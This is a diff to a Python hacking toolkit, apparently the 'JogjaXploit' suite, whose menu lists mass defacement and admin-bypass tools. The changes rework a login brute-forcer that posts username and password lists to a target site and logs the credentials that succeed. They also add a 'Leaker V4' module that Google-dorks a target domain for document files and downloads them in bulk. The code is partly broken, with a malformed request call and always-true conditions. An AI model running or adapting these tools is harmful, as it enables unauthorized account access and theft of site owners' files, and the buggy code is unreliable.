@@ -152,7 +152,7 @@ print(f"""
                 ░░         ░   ▒      ░   ░ ░  ░ ░  ░ ░ ░ ░ ▒    ░░   ░   ░   ▒   
                  ░              ░  ░         ░    ░        ░ ░     ░           ░  ░                       
                                       \033[1;32mCoded By : MrSanZz
-                                           V : 3.1.0
+                                           V : 3.1.2
                                        Team:JogjaXploit
                                   \033[1;33mhttps://github.com/MrSanZz
 """)
@@ -2082,7 +2082,7 @@ elif answer == ("20"):
     {yellow}│{blue} [07] Mass Deface V3                                                                             {yellow}│{blue}
     {yellow}│{blue} [08] DIRBER                                                                                     {yellow}│{blue}
     {yellow}│{blue} [09] Bypass Admin With File.txt                                                                 {yellow}│{blue}
-    {yellow}│{blue}                                                                                                 {yellow}│{blue}
+    {yellow}│{blue} [10] Leaker V4                                                                                  {yellow}│{blue}
     {yellow}└─────────────────────────────────────────────────────────────────────────────────────────────────┘{blue}
     """)
     print('')
@@ -2575,8 +2575,8 @@ elif answer == ("20"):
             nmp = input(f"Name For Password On Input : ")
             file_name = file
             with open(file_name, 'rb') as files:
-                files_content = files.read()
-            files_content_str = files_content.decode('utf-8')
+                files_content = files.readline()
+            files_content_str = files_content
             nick_lines = files_content_str.split()
             password_lines = files_content_str.split()
             for nick in nick_lines:
@@ -2586,6 +2586,7 @@ elif answer == ("20"):
                         payload = {
                             idu : nick,
                             idp : password
+                            
                         }
 
                         # Melakukan permintaan POST untuk login
@@ -2599,20 +2600,22 @@ elif answer == ("20"):
                         response = session.post(login_url, data=payload)
                         soup = BeautifulSoup(response.text, 'html.parser')
 
-                        # Temukan token CSRF jika diperlukan
-                        csrf_token1 = soup.find('input', {nmu: 'csrf_token'}, id=idn)['value'] if soup.find('input', {nmu: 'csrf_token'}, id=idu) else ''
-                        csrf_token2 = soup.find('input', {nmp: 'csrf_token'}, id=idp)['value'] if soup.find('input', {nmp: 'csrf_token'}, id=idp) else ''
-            
-                        csrf_token = csrf_token1 + csrf_token2
-                        # Tambahkan token CSRF ke data login
-                        payload['csrf_token'] = csrf_token
-                        # Memeriksa apakah login berhasil
+                        user_data = f'<input type="text" id="{idu}" name="{nmu}">'
+                        pass_data = f'<input type="password" id="{idp}" name="{nmp}">'
+                        yo = user_data + pass_data
+                        response = requests.post(login_url, data=yo, header=yo)
                         keyword = 'Login Success' or 'Dashboard' or 'Welcome' or 'Success' or 'Hi Admin' 
                     
                         if re.search(keyword, response.text, re.IGNORECASE):
                                 print(success + f'Login Success !')
                                 print(response)
-                                break  # Keluar dari loop jika login berhasil
+                                def log(login_url):
+                                   file = open((login_url) + ".txt", "a")
+                                   file.write(str(payload))
+                                   file.write("\n")
+                                   file.close
+                                   file_name = login_url
+                                log(login_url)
                         else:
                             print(fail + f'Login Failed.')
                             print(response)
@@ -2623,9 +2626,96 @@ elif answer == ("20"):
         except KeyboardInterrupt:
             print("Interrupt")
             exit()
-else:
-    print('\n')
-    print('Exiting.. Bye ! ')
-    time.sleep(0.5)
+    elif answer == "10":
+        if os.name == "posix":
+            os.system('clear')
+        elif os.name == "nt":
+            os.system('cls')
+        print(f"""
+        
+        {red} ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗     ██████╗ ██████╗ 
+        {green}██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔══██╗██╔══██╗
+        {blue}██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██║  ██║    ██║  ██║██████╔╝
+        {yellow}██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║    ██║  ██║██╔══██╗
+        {red}╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝    ██████╔╝██████╔╝
+        {green} ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝     ╚═════╝ ╚═════╝ 
+                                                                            
+        """)
+        files = input(f"File Extension [example : pdf xls csv] : ")
+        site = input(f"Target Site : ")
+        mode = input(f"Save As TXT / Auto Download ? txt/download : ")
+        if mode == "download":
+            file_list = files.split()
+            result = file_list
+            print('')
+            print('[!] Please Wait [!]')  
+            print(f"[ + ] All Results Will Be Downloaded On Folder {site} [ + ]")
+            time.sleep(0.6)
+            for i in result:
+                try:
+                    os.mkdir(site)
+                    print(info + f"[ + ]Searching Info For [ + ] : {i}")
+                    num = 1
+                    num = num + 1
+                    rand_user = random.choice(user_agents)
+                    for results in search(f'filetype:{i} site:{site}', num=int(num), pause=2, stop=0, start=0):
+                        print('')
+                        print(success + results)
+                        wget.download(results, out=site)
+                    else:
+                        print(white + f"[!] Couldn't Find For {i} Site : {site}")
+                except FileExistsError:
+                    print(fail + f"[!] File {site} Already Exists [!]")
+                    delete = input(f"Delete? y/n : ")
+                    if delete == "Y" or "y":
+                        os.removedirs(site)
+                    else:
+                        exit()
+                except urllib.error.HTTPError as e:
+                    if e.code == 429:
+                        print(fail + f"[!] 429 Error !!, Coldown For 25 Sec.. [!]")
+                        time.sleep(25)
+                    if e.code == 403:
+                        print(fail + f"[!] 403, File Forbidden To Download.. [!]")
+                        continue
+                    if e.code == 404:
+                        print(fail + f"[!] File Didn't Exists.. [!]")
+                        continue
+                    if e.code == 1006:
+                        print(fail + f"[!] Error While Running Task.. [!]")
+                        exit()
+        elif mode == "txt":
+            file_list = files.split()
+            result = file_list
+            print('')
+            print('[!] Please Wait [!]')
+            time.sleep(0.6)
+            for i in result:
+                try:
+                    print(info + f"[ + ] Searching Results For {i}.. [ + ]")
+                    rand_user = random.choice(user_agents)
+                    req = 1
+                    req = req + 1
+                    for results in search(f'filetype:{i} site:{site}', num=int(req), pause=2, stop=None, start=0):
+                        print('')
+                        print(success + results)
+                        def log(site):
+                            file = open((site) + ".txt", "a")
+                            file.write(str(results))
+                            file.write("\n")
+                            file.close
+                            file_name = site
+                        log(site)
+                    else:
+                        print(fail + f"[!] File {i} Doesn't Exists [!]")
+                except urllib.error.HTTPError as e:
+                    if e.code == 429:
+                        print(fail + f"[!] Error 429.. Coldown 25 sec.. [!]")
+                        time.sleep(25)
+                except KeyboardInterrupt:
+                    print("Interrupt")
+                    exit()
+            print(success + f"[ + ] Done.. [ + ]")
+if KeyboardInterrupt is True:
+    print("Interrupt")
     exit()
-	    
